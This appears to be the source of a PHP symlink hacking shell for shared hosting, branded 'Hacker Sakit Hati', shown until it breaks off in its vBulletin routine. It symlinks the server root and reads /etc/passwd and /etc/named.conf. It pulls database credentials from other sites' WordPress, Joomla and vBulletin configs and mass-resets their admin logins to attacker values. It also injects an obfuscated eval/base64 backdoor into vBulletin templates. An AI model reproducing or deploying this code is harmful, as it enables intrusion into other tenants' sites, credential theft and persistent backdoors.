<font class="hk2" style="text-shadow: 1px -1px 8px;"> 
<center>


<!--by hacker sakit hati-->  
<head>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style>
</head>

<title>&#1203;&#824;&#1202;&#824;&#1203; Hacker Sakit Hati &#1203;&#824;&#1202;&#824;&#1203;</title> <style type="text/css"><!-- a:link{color:#ffffff;text-decoration:none}--></style> <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"><script language="JavaScript">function tb5_makeArray(n){ this.length = n; return this.length;



}



tb5_messages = new tb5_makeArray(2);



tb5_messages[0] = "Hacker Sakit Hati";



tb5_messages[1] = "Hacker Sakit Hati";



tb5_rptType = 'infinite';



tb5_rptNbr = 100;



tb5_speed = 200;



tb5_delay = 50;



var tb5_counter=1;



var tb5_currMsg=0;



var tb5_stsmsg="";



function tb5_shuffle(arr){



var k;



for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 1)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp;



}



return arr;



}



tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_";



}



tb5_arr = tb5_shuffle(tb5_arr);



function tb5_init(n){



var k;



if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay;



}



else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);



}



function tb5_randomizetitle(){ tb5_init(0);



}



tb5_randomizetitle();</script><script>/*



An object-oriented Typing Text script, to allow for multiple instances.



A script that causes any text inside any text element to be "typed out", one letter at a



time. Note that any HTML tags will not be included in the typed output, to prevent them



from causing problems. Tested in Firefox v1.5.0.1, Opera v8.52, Konqueror v3.5.1, and IE



v6.



Browsers that do not support this script will simply see the text fully displayed from the



start, including any HTML tags.



Functions defined: TypingText(element, [interval = 100,] [cursor = "",] [finishedCallback = function()



{return}]): Create a new TypingText object around the given element. Optionally specify a delay between characters of interval milliseconds. cursor allows users to specify some HTML to be appended to the end of the string whilst typing. Optionally, can also be a function which accepts the current text as an argument. This allows the user to create a "dynamic cursor" which changes depending on the latest character or the current length of the string. finishedCallback allows advanced scripters to supply a function to be executed on finishing. The function must accept no arguments. TypingText.run(): Run the effect. static TypingText.runAll(): Run all TypingText-enabled objects on the page.



*/



TypingText = function(element, interval, cursor, finishedCallback) { if((typeof document.getElementById == "undefined") || (typeof element.innerHTML ==



"undefined")) { this.running = true; // Never run. return; } this.element = element; this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; }); this.interval = (typeof interval == "undefined" ? 100 : interval); this.origText = this.element.innerHTML; this.unparsedOrigText = this.origText; this.cursor = (cursor ? cursor : ""); this.currentText = ""; this.currentChar = 0; this.element.typingText = this; if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++; TypingText.all.push(this); this.running = false; this.inTag = false; this.tagBuffer = ""; this.inHTMLEntity = false; this.HTMLEntityBuffer = "";



}



TypingText.all = new Array();



TypingText.currentIndex = 0;



TypingText.runAll = function() { for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();



}



TypingText.prototype.run = function() { if(this.running) return; if(typeof this.origText == "undefined") { setTimeout("document.getElementById('" + this.element.id + "').typingText.run()",



this.interval); // We haven't finished loading yet. Have patience. return; } if(this.currentText == "") this.element.innerHTML = "";



// this.origText = this.origText.replace(/<([^<])*>/, ""); // Strip HTML from text. if(this.currentChar < this.origText.length) { if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) { this.tagBuffer = "<"; this.inTag = true; this.currentChar++; this.run(); return; } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) { this.tagBuffer += ">"; this.inTag = false; this.currentText += this.tagBuffer; this.currentChar++; this.run(); return; } else if(this.inTag) { this.tagBuffer += this.origText.charAt(this.currentChar); this.currentChar++; this.run(); return; } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) { this.HTMLEntityBuffer = "&"; this.inHTMLEntity = true; this.currentChar++; this.run(); return; } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) { this.HTMLEntityBuffer += ";"; this.inHTMLEntity = false; this.currentText += this.HTMLEntityBuffer; this.currentChar++; this.run(); return; } else if(this.inHTMLEntity) { this.HTMLEntityBuffer += this.origText.charAt(this.currentChar); this.currentChar++; this.run(); return; } else { this.currentText += this.origText.charAt(this.currentChar); } this.element.innerHTML = this.currentText; this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof



this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : ""); this.currentChar++; setTimeout("document.getElementById('" + this.element.id + "').typingText.run()",



this.interval); } else { this.currentText = ""; this.currentChar = 0; this.running = false; this.finishedCallback(); }



}</script><center>
<!--by hacker sakit hati-->

</head>

<body>
<style type="text/css">
body {




background: black url("http://2.bp.blogspot.com/-Gc5k--PvR5s/Ue3pzaZxNmI/AAAAAAAABKA/SRaz-fAXYv0/s200/0_1_1.gif");




background-repeat: repeat;




background-position: center;




background-attachment: fixed;


}




</style>

</center><center>
<br>
<font class="hk2" style="text-shadow: 1px -1px 8px;"> <script language="JavaScript1.2">



function ClearError() {return true;}



window.onerror = ClearError;



</script>
<br>

<div align="center"><table border="0" width="60%"><tr><td>



<h1><font face="Bradley Hand ITC"><center><SCRIPT>



farbbibliothek = new Array();



farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");



farbbibliothek[1] = new Array("#FF0000","#FFFFFF","#FFFFFF","#FF0000");



farbbibliothek[2] = new Array("#FFFFFF","#FF0000","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF");



farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");



farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");


farbbibliothek[5] = new Array("#FF0000","#FF0000","#FF0000","#FFFFFF","#FFFFFF","#FFFFFF");


farbbibliothek[6] = new Array("#FF0000","#FDF5E6");



farben = farbbibliothek[4];



function farbschrift()



{



for(var i=0 ; i<Buchstabe.length; i++)



{



document.all["a"+i].style.color=farben[i];



}



farbverlauf();



}



function string2array(text)



{



Buchstabe = new Array();



while(farben.length<text.length)



{



farben = farben.concat(farben);



}



k=0;



while(k<=text.length)



{



Buchstabe[k] = text.charAt(k);



k++;



}



}



function divserzeugen()



{



for(var i=0 ; i<Buchstabe.length; i++)



{



document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>");



}



farbschrift();



}



var a=1;



function farbverlauf()



{



for(var i=0 ; i<farben.length; i++)



{



farben[i-1]=farben[i];



}



farben[farben.length-1]=farben[-1];







setTimeout("farbschrift()",30);



}



//



var farbsatz=1;



function farbtauscher()



{



farben = farbbibliothek[farbsatz];



while(farben.length<text.length)



{



farben = farben.concat(farben);



}



farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));



}



setInterval("farbtauscher()",9000);



text =" HACKER SAKIT HATI SYMLINK ";//h



string2array(text);



divserzeugen();



//document.write(text);




</SCRIPT></center></h1></font><br>
</object>
</center>
<center>
<style type='text/css'>

<?php
set_time_limit(0);
error_reporting(0);


$pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
$u = explode("/",$pageURL );
$pageURL =str_replace($u[count($u)-1],"",$pageURL );

$pageFTP = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
$u = explode("/",$pageFTP );
$pageFTP =str_replace($u[count($u)-1],"",$pageFTP );

?>


<head>
<title>Hacker Sakit Hati Symlink</title>

<style type="text/css">
<font class="hk2" style="text-shadow: 2px -3px 8px;"> 
html,body {
margin: 0;
padding: 0;
outline: 0;
}
a{

font-size: 13px;

}


body {
direction: ltr;
background-color:# ;
color: rgb(153, 153, 153);
text-align: center
}



input,textarea,select{
font-weight: bold;
color: black;
}

input,textarea,select:hover{
box-shadow: 0px 0px 4px aqua;
}


.hedr {
font-family: Tahoma, Arial, sans-serif ;
font-size: 22px;


}

.cont a{

text-decoration: none;
color: #   ;
font-family: Tahoma, Arial, sans-serif ;
font-size: 16px;
text-shadow: 0px 0px 3px ;
}

.cont a:hover{


color: white ;
text-shadow:3px 2px 3px white ;


}

.tmp tr td{

border: solid 1px white;

padding: 2px ;
font-size: 13px;
}

.tmp tr td a {
text-decoration: none;



}

.foter{
font-size: 9pt;
color: aqua ;
text-align: center
}

.tmp tr td:hover{

box-shadow: 0px 0px 4px Mediumslateblue  ;

}
.fot{

font-family:Tahoma, Arial, sans-serif;

font-size: 11pt;
}
.for a : hover{

text-shadow: 0px 0px 1px #3366FF;

}


.ir {
color: #FF0000;
}



</style>

</head>

<body>

<div class='all'>


<?php

@mkdir('sym',0777);
$htcs = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f =@fopen ('sym/.htaccess','w');
fwrite($f , $htcs);



@symlink("/","sym/root");

$pg = basename(__FILE__);


echo '<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;"><div class="cont">

[<a href="?"> Home </a>]

[<a href="?SmlP?sws=sym"> User & Domains & Symlink </a>]

[<a href="?SmlP?sws=sec"> Domains & Script </a>]

[ <a href="?SmlP?sws=file"> Symlink File </a>]

[<a href="?SmlP?sws=passwd"> Symlink Bypass </a>]

<br /><br />

[ <a href="?SmlP?sws=read"> Bypass Read </a>]

[ <a href="?SmlP?sws=joomla"> Mass Joomla </a>]

[ <a href="?SmlP?sws=wp"> Mass WordPress </a>]

[ <a href="?SmlP?sws=vb"> Mass vBulletin </a>]

[ <a href="?SmlP?sws=help"> Help </a>]

<br /></div><br />






</div>';

if(isset($_REQUEST['sws']))
{

switch ($_REQUEST['sws'])
{





/// Domains + Scripts ///

case 'sec':

if(!@is_file('named.txt')){

$d00m = @file("/etc/named.conf");

}else{

$d00m = @file("named.txt");


}
if(!$d00m)
{

die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<table align='center' width='40%'><td> Domains </td><td> Script </td>";
foreach($d00m as $dom){

flush();
flush();



if(eregi("zone",$dom)){

@preg_match_all('#zone "(.*)"#', $dom, $domsws);

flush();

if(@strlen(trim($domsws[1][0])) > 2){

$user = @posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/wp-config.php";
$wpp=@get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/wp-config.php";
$wpp2=@get_headers($wp2);
$wp12=$wpp2[0];

///////////////////////////////

$jo1=$pageURL."/sym/root/home/".$user['name']."/public_html/configuration.php";
$joo=@get_headers($jo1);
$jo=$joo[0];


$jo2=$pageURL."/sym/root/home/".$user['name']."/public_html/joomla/configuration.php";
$joo2=@get_headers($jo2);
$jo12=$joo2[0];

////////////////////////////////

$vb1=$pageURL."/sym/root/home/".$user['name']."/public_html/includes/config.php";
$vbb=@get_headers($vb1);
$vb=$vbb[0];

$vb2=$pageURL."/sym/root/home/".$user['name']."/public_html/vb/includes/config.php";
$vbb2=@get_headers($vb2);
$vb12=$vbb2[0];

$vb3=$pageURL."/sym/root/home/".$user['name']."/public_html/forum/includes/config.php";
$vbb3=@get_headers($vb3);
$vb13=$vbb3[0];

/////////////////

$wh1=$pageURL."/sym/root/home/".$user['name']."public_html/clients/configuration.php";
$whh2= @get_headers($wh1);
$wh=$whh2[0];

$wh2=$pageURL."/sym/root/home/".$user['name']."/public_html/support/configuration.php";
$whh2= @get_headers($wh2);
$wh12=$whh2[0];

$wh3=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
$whh3= @get_headers($wh3);
$wh13=$whh3[0];

$wh5=$pageURL."/sym/root/home/".$user['name']."/public_html/submitticket.php";
$whh5= @get_headers($wh5);
$wh15=$whh5[0];

$wh4=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
$whh4= @get_headers($wh4);
$wh14=$whh4[0];



////////////////////////////////////////////////////////////////////////////////

////////// Wordpress ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
$config="<a href='".$wpl."' target='_blank'>Wordpress</a>";
}
elseif (strpos($wp12, "200") == true)
{
$config="<a href='".$wp2."' target='_blank'>Wordpress</a>";
}

///////////WHMCS////////

elseif (strpos($jo, "200") == true and strpos($wh15, "200") == true )
{
$config=" <a href='".$wh5."' target='_blank'>WHMCS</a>";

}
elseif (strpos($wh12, "200") == true)
{
$config =" <a href='".$wh2."' target='_blank'>WHMCS</a>";
}

elseif (strpos($wh13, "200") == true)
{
$config =" <a href='".$wh3."' target='_blank'>WHMCS</a>";

}

///////// Joomla to 4 ///////////

elseif (strpos($jo, "200") == true)
{
$config=" <a href='".$jo1."' target='_blank'>Joomla</a>";
}

elseif (strpos($jo12, "200") == true)
{
$config=" <a href='".$jo2."' target='_blank'>Joomla</a>";
}

//////////vBulletin to 4 ///////////

elseif (strpos($vb, "200") == true)
{
$config=" <a href='".$vb1."' target='_blank'>vBulletin</a>";
}

elseif (strpos($vb12, "200") == true)
{
$config=" <a href='".$vb2."' target='_blank'>vBulletin</a>";
}

elseif (strpos($vb13, "200") == true)
{
$config=" <a href='".$vb3."' target='_blank'>vBulletin</a>";
}

else
{
continue;
}
flush();
flush();

/////////////////////////////////////////////////////////////////////////////////////



$site = $user['name'] ;



flush();

echo "<tr><td><a href=http://www.".$domsws[1][0]."/>".$domsws[1][0]."</a></td>
<td>".$config."</td></tr>"; flush();

}
}
}
}




break;


/// user + domine + symlink ///

case 'sym':

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

}else{

$d00m = @file("named.txt");


}
if(!$d00m)
{

die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
}
else

{
echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domsws);

flush();

if(strlen(trim($domsws[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));

flush();



$site = $user['name'] ;


@symlink("/","sym/root");

$site = $domsws[1][0];

$ir = 'ir';

$il = 'il';

if (preg_match("/.^$ir/",$domsws[1][0]) or preg_match("/.^$il/",$domsws[1][0]) )
{
$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domsws[1][0]."</div>";
}


echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$domsws[1][0]."/>".$site." </a> </div>
</td>


<td>
".$user['name']."
</td>






<td>
<a href='sym/root/home/".$user['name']."/public_html' target='_blank'>symlink </a>
</td>


</tr></div> ";


flush();
flush();

}
}
}
}




break;


/// file symlink ///

case 'file':

echo'
The file path to symlink

<br /><br />
<form method="post">
<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
<input type="text" name="symfile" value="/ngecrot/Sabun.txt " size="60"/><br /><br />
<input type="submit" value="Ngecrot" name="symlink" /> <br /><br />



</form>
';

$pfile = $_POST['file'];
$symfile = $_POST['symfile'];
$symlink = $_POST['symlink'];

if ($symlink)
{


@mkdir('sym1',0777);
$c = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n Require None \n Satisfy Any";
$f =@fopen ('sym1/.htaccess','w');
@fwrite($f , $c);

@symlink("$pfile","sym1/$symfile");

echo '<br /><a target="_blank" href="sym1/'.$symfile.'" >'.$symfile.'</a>';

}



break;

/// bypass read

case 'read':

echo "read /etc/named.conf";
echo "<br /><br /><form method='post' action='?SmlP?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
flush();
flush();


$file = '/etc/named.conf';


$r3ad = @fopen($file, 'r');
if ($r3ad){
$content = @fread($r3ad, @filesize($file));
echo "".htmlentities($content)."";
}
else if (!$r3ad)
{
$r3ad = @show_source($file) ;
}
else if (!$r3ad)
{
$r3ad = @highlight_file($file);
}
else if (!$r3ad)
{
$sm = @symlink($file,'sym.txt');


if ($sm){
$r3ad = @fopen('sym/sym.txt', 'r');
$content = @fread($r3ad, @filesize($file));
echo "".htmlentities($content)."";

}
}



echo "</textarea><br /><br /><input type='submit' value='save'/> </form>";


if(isset($_GET['save'])){


$cont = stripcslashes($_POST['file']);

$f = fopen('named.txt','w');

$w = fwrite($f,$cont);

if($w){

echo '<br />Wes Di Sempen ';

}

fclose($f);




}



break;

// passwd

case 'passwd':

if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){


$cont = stripcslashes($_POST['file']);

if(!file_exists('passwd.txt')){

$f = @fopen('passwd.txt','w');

$w = @fwrite($f,$cont);

fclose($f);
}
if($w or @filesize('passwd.txt') > 0){
// * SHOW * //

echo "<div class='tmp'><table align='center' width='100%'><td>Users</td><td>symlink</td><td>FTP</td>";
flush();

$fil3 = file('passwd.txt');

foreach ($fil3 as $f){

$u=explode(':', $f);
$user = $u['0'];



echo "
<tr>



<td width='15%'>
$user
</td>






<td width='10%'>
<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
</td>

<td width='10%'>
<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
</td>



</tr></div> ";


flush();
flush();


}






die ("</tr></div>");


}





}



echo "read /etc/passwd";
echo "<br /><br /><form method='post' action='?SmlP?SmlP?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
flush();

$file = '/etc/passwd';


$r3ad = @fopen($file, 'r');
if ($r3ad){
$content = @fread($r3ad, @filesize($file));
echo "".htmlentities($content)."";
}
elseif(!$r3ad)
{
$r3ad = @show_source($file) ;
}
elseif(!$r3ad)
{
$r3ad = @highlight_file($file);
}
elseif(!$r3ad)
{

for($uid=0;$uid<1000;$uid++){
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}

}

}


flush();


echo "</textarea><br /><br /><input type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
flush();

break;



case 'joomla':

/////////////////////////////////////////////////////////////////// xxxxxxxxxxxxxxxxxxx ////////////////////////////


if(isset($_POST['s'])){

$file = @file_get_contents('Jomblo.txt');

$ex = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
flush();


foreach ($ex as $exp){

$es = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig = @file_get_contents(trim($config));

if(ereg('JConfig',$readconfig)){



$pass = ex($readconfig,'$password = \'',"';");

$userdb = ex($readconfig,'$user = \'',"';");

$db = ex($readconfig,'$db = \'',"';");

$fix = ex($readconfig,'$dbprefix = \'',"';");

$tab = $fix.'users';


$con = @mysql_connect('localhost',$userdb,$pass);

$db = @mysql_select_db($db,$con);

$query = @mysql_query("UPDATE `$tab` SET `username` ='HsH'");


$query3 = @mysql_query("UPDATE `$tab` SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'");


if ($query and $query3 ){$r = '<b style="color: #006600">Succeed </b>user [ HsH ] pass [1]</b>';}else{$r = '<b style="color:red">failed</b>';}

$domins = trim($domin).'';

echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='$config'>config</a></td><td>".$r."</td></tr>";
flush();



}else{

echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='http://$exp'>config</a></td><td><b style='color:red'>failed</b></td></tr>";
flush();

}

}









die();

}

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

flush();


}else{

$d00m = file("named.txt");


}
if(!$d00m)
{

die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<form method='POST' action='$pg?SmlP?sws=joomla'>
<input type='submit' value='Mass ching Admin' />
<input type='hidden' value='1' name='s' />
</form><br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";

$f = fopen('joomla.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domsws);

if(strlen(trim($domsws[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/configuration.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/configuration.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sym/root/home/".$user['name']."/public_html/joomla/configuration.php";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


////////// joomla ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
$config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
$config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
$config= $wp3;
}
else
{
continue;

}
flush();

/////////////////////////////////////////////////////////////////////////////////////

$dom = $domsws[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}


echo "<tr><td><a href=http://www.".$domsws[1][0].">".$domsws[1][0]."</a></td>
<td><a href='$config'>config</a></td><td>".$r."</td></tr>";





flush();


}
}
}
}


break;

case 'wp':

############################ index #########################3






######## admin ##########33

if(isset($_POST['s'])){

$file = @file_get_contents('WaniPiro.txt');

$ex = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
flush();
flush();


foreach ($ex as $exp){

$es = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig = @file_get_contents(trim($config));

if(ereg('wp-settings.php',$readconfig)){



$pass = ex($readconfig,"define('DB_PASSWORD', '","');");

$userdb = ex($readconfig,"define('DB_USER', '","');");

$db = ex($readconfig,"define('DB_NAME', '","');");

$fix = ex($readconfig,'$table_prefix = \'',"';");

$tab = $fix.'users';

$con = @mysql_connect('localhost',$userdb,$pass);

$db = @mysql_select_db($db,$con);

$query = @mysql_query("UPDATE `$tab` SET `user_login` ='HsH'") or die;

$query = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;



if ($query){$r = '<b style="color: #006600">Succeed </b>user [ HsH ] pass [1]</b>';}

else

{

$r = '<b style="color:red">failed</b>';

}

$domins = trim($domin).'';

echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='$config'>config</a></td><td>".$r."</td></tr>";

flush();
flush();






}else{

echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";

flush();
flush();

}

}










die();

}

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

}else{

$d00m = @file("named.txt");


}
if(!$d00m)
{

die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<form method='POST' action='$pg?SmlP?sws=wp'>
<input type='submit' value='Mass Change Admin' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";

flush();
flush();

$f = fopen('wp.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domsws);

if(strlen(trim($domsws[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/wp-config.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/wp-config.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sym/root/home/".$user['name']."/public_html/wp/wp-config";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


////////// wp ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
$config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
$config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
$config= $wp3;
}
else
{
continue;

}
flush();

/////////////////////////////////////////////////////////////////////////////////////

$dom = $domsws[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}


echo "<tr><td><a href=http://www.".$domsws[1][0].">".$domsws[1][0]."</a></td>
<td><a href='$config'>config</a></td><td>".$r."</td></tr>";
flush();
flush();





flush();


}
}
}
}


break;


case 'vb':


if(isset($_POST['s'])){



$file = @file_get_contents('vb.txt');

$ex = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";


foreach ($ex as $exp){

$es = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig = @file_get_contents(trim($config));

if(ereg('vBulletin',$readconfig)){



$db = ex($readconfig,'$config[\'Database\'][\'dbname\'] = \'',"';");

$userdb = ex($readconfig,'$config[\'MasterServer\'][\'username\'] = \'',"';");

$pass = ex($readconfig,'$config[\'MasterServer\'][\'password\'] = \'',"';");

$con = @mysql_connect('localhost',$userdb,$pass);

$db = @mysql_select_db($db,$con);

$shell = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;

$crypt = "{\${eval(gzinflate(base64_decode(\'";

$crypt .= "$shell";

$crypt .= "\')))}}{\${exit()}}</textarea>";

$sqlfaq = "UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'" ;

$query = @mysql_query($sqlfaq,$con);



if ($query){$r = '<b style="color: #006600">Succeed</b> shell in search.php';}

else

{

$r = '<b style="color:red">failed</b>';

}

$domins = trim($domin).'';

echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='$config'>config</a></td><td>".$r."</td></tr>";







}else{

echo "<tr>
